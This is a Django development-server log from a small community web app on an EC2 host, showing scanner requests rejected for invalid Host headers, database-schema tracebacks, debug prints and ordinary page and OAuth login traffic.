Bad Request: /http:/18.220.31.143/
Bad Request: /
[11/Dec/2018 22:00:02] "CONNECT xui.ptlogin2.qq.com:443 HTTP/1.1" 400 62535
[11/Dec/2018 22:00:02] "GET http://18.220.31.143/ HTTP/1.1" 400 62350
[11/Dec/2018 22:00:02] "OPTION / HTTP/1.1" 400 62152
[11/Dec/2018 22:00:04] code 400, message Bad request version ('\x03\x00(\x00\x04ÿU\x01\x00\x08\x00\x00\x00MSSQLServer\x00d!\x00\x00')
[11/Dec/2018 22:00:04] " 4            ( ÿU    MSSQLServer d!  " 400 -
[11/Dec/2018 22:00:04] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00')
[11/Dec/2018 22:00:04] "  à          " 400 -
[11/Dec/2018 22:00:04] code 400, message Bad request syntax ('\x00\x9c\x00\x01\x1a+<M\x00\x01\x00\x00\x01\x00M\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
[11/Dec/2018 22:00:04] "  +<M    M                                                                                                                                           " 400 -
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 22:10:13] "GET / HTTP/1.0" 400 62416
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 22:31:37] "GET / HTTP/1.0" 400 62418
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 22:34:40] "GET / HTTP/1.0" 400 62420
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 22:35:18] "GET / HTTP/1.0" 400 62418
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 22:43:56] "GET / HTTP/1.0" 400 62416
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 23:06:45] "GET / HTTP/1.0" 400 62418
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 23:23:59] "GET / HTTP/1.0" 400 62420
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 23:33:23] "GET / HTTP/1.0" 400 62419
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 00:02:13] "GET / HTTP/1.0" 400 62418
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 00:13:30] "GET / HTTP/1.0" 400 62419
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 00:17:35] "GET / HTTP/1.0" 400 62418
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 00:41:37] "GET / HTTP/1.0" 400 62420
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 00:41:40] "GET / HTTP/1.0" 400 62420
[12/Dec/2018 00:41:43] "GET / HTTP/1.0" 400 62420
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 00:41:50] "GET / HTTP/1.1" 400 62407
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 01:09:05] "GET / HTTP/1.0" 400 62419
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 01:19:00] "GET / HTTP/1.0" 400 62418
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 01:44:24] "GET / HTTP/1.0" 400 62316
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 02:14:06] "GET / HTTP/1.0" 400 62418
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 02:26:43] "GET / HTTP/1.0" 400 62419
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 02:33:14] "GET / HTTP/1.0" 400 62418
----------------------------------------
Exception happened during processing of request from ('61.219.11.151', 64007)
Traceback (most recent call last):
  File "/usr/lib64/python3.7/socketserver.py", line 647, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.7/socketserver.py", line 357, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.7/socketserver.py", line 717, in __init__
    self.handle()
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 139, in handle
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.7/socket.py", line 589, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 02:45:19] "GET / HTTP/1.1" 400 62414
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 02:48:07] "GET / HTTP/1.1" 400 62409
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 02:50:53] "GET / HTTP/1.0" 400 62418
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 02:56:43] "GET / HTTP/1.0" 400 62419
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 03:08:54] "GET / HTTP/1.1" 400 62408
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 03:49:28] "GET / HTTP/1.0" 400 62418
Not Found: /robots.txt
[12/Dec/2018 04:49:49] "GET /robots.txt HTTP/1.1" 404 5961
[12/Dec/2018 04:49:53] "GET /community/3/members_list HTTP/1.1" 200 5455
[12/Dec/2018 04:59:01] "GET /community/4 HTTP/1.1" 301 0
[12/Dec/2018 04:59:05] "GET /community/4/ HTTP/1.1" 200 9587
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
Bad Request: /
[12/Dec/2018 04:59:29] "GET / HTTP/1.1" 400 62543
[12/Dec/2018 04:59:29] "GET / HTTP/1.1" 400 62544
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 05:07:51] "GET / HTTP/1.0" 400 62417
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 05:40:34] "GET / HTTP/1.0" 400 62419
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 05:44:09] "GET / HTTP/1.0" 400 62419
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 05:56:40] "GET / HTTP/1.1" 400 62404
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 06:26:41] "GET / HTTP/1.1" 400 62407
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 06:50:52] "GET / HTTP/1.0" 400 62418
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 06:54:02] "GET / HTTP/1.0" 400 62419
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 07:06:08] "GET / HTTP/1.1" 400 62406
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 07:11:51] "GET / HTTP/1.0" 400 62418
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
Bad Request: /
[12/Dec/2018 07:21:25] "GET / HTTP/1.0" 400 62420
[12/Dec/2018 07:21:25] "GET / HTTP/1.0" 400 62420
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 07:53:58] "GET / HTTP/1.0" 400 62419
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 08:19:46] "GET / HTTP/1.1" 400 62408
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 08:30:28] "GET / HTTP/1.0" 400 62417
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 08:37:04] "GET / HTTP/1.0" 400 62419
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 08:43:46] "GET / HTTP/1.0" 400 62419
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 08:44:20] "GET / HTTP/1.0" 400 62419
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 08:44:21] "GET / HTTP/1.0" 400 62419
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 08:55:34] "GET / HTTP/1.1" 400 62408
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 09:25:28] "GET / HTTP/1.0" 400 62419
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 10:12:29] "GET / HTTP/1.1" 400 62376
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 10:35:33] "GET / HTTP/1.0" 400 62418
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 10:58:23] "GET / HTTP/1.0" 400 62418
[12/Dec/2018 11:08:00] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_DvPt80B.jpg HTTP/1.1" 304 0
[12/Dec/2018 11:08:00] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_sOvU3Fz.jpg HTTP/1.1" 304 0
[12/Dec/2018 11:08:00] "GET /media/media/Screen_Shot_2018-11-22_at_12.43.59_AM.png HTTP/1.1" 304 0
[12/Dec/2018 11:08:00] "GET /media/media/Screen_Shot_2018-12-03_at_3.56.49_PM.png HTTP/1.1" 304 0
[12/Dec/2018 11:08:00] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_zLD6F9Z.jpg HTTP/1.1" 304 0
[12/Dec/2018 11:08:00] "GET /media/media/Pink-Floyd-Back-Catalogue-music-1.jpg HTTP/1.1" 304 0
[12/Dec/2018 11:08:02] "GET /media/media/brasspanchmukhinaag-500x500.png HTTP/1.1" 304 0
[12/Dec/2018 11:08:02] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_eaOXxUw.jpg HTTP/1.1" 304 0
[12/Dec/2018 11:08:02] "GET /media/media/ACDC-Wallpaper-For-Desktop.jpg HTTP/1.1" 304 0
[12/Dec/2018 11:08:02] "GET /media/media/40af0d468633a4ee2f2344e6021f056b.jpg HTTP/1.1" 304 0
[12/Dec/2018 11:08:02] "GET /media/media/jimmy-page-led-zeppelin-wallpaper.jpg HTTP/1.1" 304 0
[12/Dec/2018 11:08:02] "GET /media/media/23283091_511838242502259_654899688_n.png HTTP/1.1" 304 0
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[12/Dec/2018 11:08:03] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
[12/Dec/2018 11:08:03] "GET /media/media/abstract-access-close-up-1089438_fJciEGK.jpg HTTP/1.1" 304 0
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[12/Dec/2018 11:08:03] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
[12/Dec/2018 11:08:12] "GET /media/media/abstract-access-close-up-1089438.jpg HTTP/1.1" 200 5118188
[12/Dec/2018 11:16:50] "GET / HTTP/1.1" 200 13663
[12/Dec/2018 11:16:55] "GET /media/media/logo.png HTTP/1.1" 200 11255
[12/Dec/2018 11:16:55] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[12/Dec/2018 11:16:56] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[12/Dec/2018 11:17:31] "GET / HTTP/1.1" 200 13663
[12/Dec/2018 11:17:32] "GET /media/media/logo.png HTTP/1.1" 200 11255
[12/Dec/2018 11:17:33] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[12/Dec/2018 11:17:34] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 11:18:03] "GET / HTTP/1.1" 400 62633
[12/Dec/2018 11:19:01] "GET / HTTP/1.1" 200 13663
[12/Dec/2018 11:19:01] "GET /media/media/logo.png HTTP/1.1" 200 11255
[12/Dec/2018 11:19:03] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[12/Dec/2018 11:19:04] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[12/Dec/2018 11:31:57] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[12/Dec/2018 11:31:57] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[12/Dec/2018 11:32:10] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[12/Dec/2018 11:32:10] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[12/Dec/2018 11:32:30] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[12/Dec/2018 11:32:30] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[12/Dec/2018 11:32:39] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[12/Dec/2018 11:32:39] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054

admin <QuerySet [<Admins: Admins object (2)>]>
2
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
5
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Nipun Goyal>]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
here
None
admin <QuerySet [<Admins: Admins object (2)>]>
2
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
5
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Nipun Goyal>]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
Internal Server Error: /
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/backends/utils.py", line 85, in _execute
    return self.cursor.execute(sql, params)
psycopg2.ProgrammingError: column togther_userinfo.email does not exist
LINE 1: ...serinfo"."user_id_id", "togther_userinfo"."name", "togther_u...
                                                             ^


The above exception was the direct cause of the following exception:

Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 35, in dashboard
    if not usr :
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/query.py", line 272, in __bool__
    self._fetch_all()
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/query.py", line 1183, in _fetch_all
    self._result_cache = list(self._iterable_class(self))
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/query.py", line 54, in __iter__
    results = compiler.execute_sql(chunked_fetch=self.chunked_fetch, chunk_size=self.chunk_size)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/sql/compiler.py", line 1061, in execute_sql
    cursor.execute(sql, params)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/backends/utils.py", line 100, in execute
    return super().execute(sql, params)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/backends/utils.py", line 68, in execute
    return self._execute_with_wrappers(sql, params, many=False, executor=self._execute)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/backends/utils.py", line 77, in _execute_with_wrappers
    return executor(sql, params, many, context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/backends/utils.py", line 85, in _execute
    return self.cursor.execute(sql, params)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/utils.py", line 89, in __exit__
    raise dj_exc_value.with_traceback(traceback) from exc_value
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/backends/utils.py", line 85, in _execute
    return self.cursor.execute(sql, params)
django.db.utils.ProgrammingError: column togther_userinfo.email does not exist
LINE 1: ...serinfo"."user_id_id", "togther_userinfo"."name", "togther_u...
                                                             ^

[12/Dec/2018 11:36:00] "GET / HTTP/1.1" 500 124928
[12/Dec/2018 11:36:32] "GET /logout HTTP/1.1" 302 0
[12/Dec/2018 11:36:32] "GET /login/ HTTP/1.1" 200 2576
[12/Dec/2018 11:36:33] "GET /media/media/logo.jpeg HTTP/1.1" 304 0
[12/Dec/2018 11:36:35] "GET /login/ HTTP/1.1" 200 2576
[12/Dec/2018 11:36:42] "GET / HTTP/1.1" 200 13159
[12/Dec/2018 11:36:43] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 11:36:43] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 304 0
[12/Dec/2018 11:36:43] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[12/Dec/2018 11:36:47] "GET /community/4 HTTP/1.1" 301 0
Internal Server Error: /community/4/
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/backends/utils.py", line 85, in _execute
    return self.cursor.execute(sql, params)
psycopg2.ProgrammingError: column togther_userinfo.email does not exist
LINE 1: ...serinfo"."user_id_id", "togther_userinfo"."name", "togther_u...
                                                             ^


The above exception was the direct cause of the following exception:

Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 119, in community
    print('admin: ',admin_details)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/query.py", line 244, in __repr__
    data = list(self[:REPR_OUTPUT_SIZE + 1])
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/query.py", line 268, in __iter__
    self._fetch_all()
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/query.py", line 1183, in _fetch_all
    self._result_cache = list(self._iterable_class(self))
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/query.py", line 54, in __iter__
    results = compiler.execute_sql(chunked_fetch=self.chunked_fetch, chunk_size=self.chunk_size)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/sql/compiler.py", line 1061, in execute_sql
    cursor.execute(sql, params)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/backends/utils.py", line 100, in execute
    return super().execute(sql, params)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/backends/utils.py", line 68, in execute
    return self._execute_with_wrappers(sql, params, many=False, executor=self._execute)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/backends/utils.py", line 77, in _execute_with_wrappers
    return executor(sql, params, many, context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/backends/utils.py", line 85, in _execute
    return self.cursor.execute(sql, params)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/utils.py", line 89, in __exit__
    raise dj_exc_value.with_traceback(traceback) from exc_value
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/backends/utils.py", line 85, in _execute
    return self.cursor.execute(sql, params)
django.db.utils.ProgrammingError: column togther_userinfo.email does not exist
LINE 1: ...serinfo"."user_id_id", "togther_userinfo"."name", "togther_u...
                                                             ^

[12/Dec/2018 11:36:48] "GET /community/4/ HTTP/1.1" 500 130271
[12/Dec/2018 11:38:05] "GET /community/4/ HTTP/1.1" 200 9872
[12/Dec/2018 11:38:11] "GET /login/ HTTP/1.1" 200 2576
[12/Dec/2018 11:42:23] "GET /oauth/login/linkedin-oauth2/ HTTP/1.1" 302 0
[12/Dec/2018 11:42:25] "GET /oauth/complete/linkedin-oauth2/?code=AQRAYeX89tsa8v7mmtfyKaeUeVJvngyUq_SfZ23OKe_363fN9PBO9W7lpR18AsXsoVglxGXLNZPoBJoVXQ5dJqpBvYtJoT0lMU7OV82u6xhbN69clETXrr0O2u57hbbKiCC4L45hNCc9KL1JVOIqZrcpZA_RU_c_-qLPuIroJOnUJMtpBg7d_5qkOPP5qw&state=YQ1nZ2apiduTNY1ZhcrHjIhH5HVRKbRk HTTP/1.1" 302 0
[12/Dec/2018 11:42:25] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 11:42:29] "GET /community/3 HTTP/1.1" 301 0
[12/Dec/2018 11:42:30] "GET /community/3/ HTTP/1.1" 200 10748
[12/Dec/2018 11:42:34] "GET /requests HTTP/1.1" 200 7272
[12/Dec/2018 11:42:40] "GET /requests?status=1&id=2&_=1544614883721 HTTP/1.1" 200 16
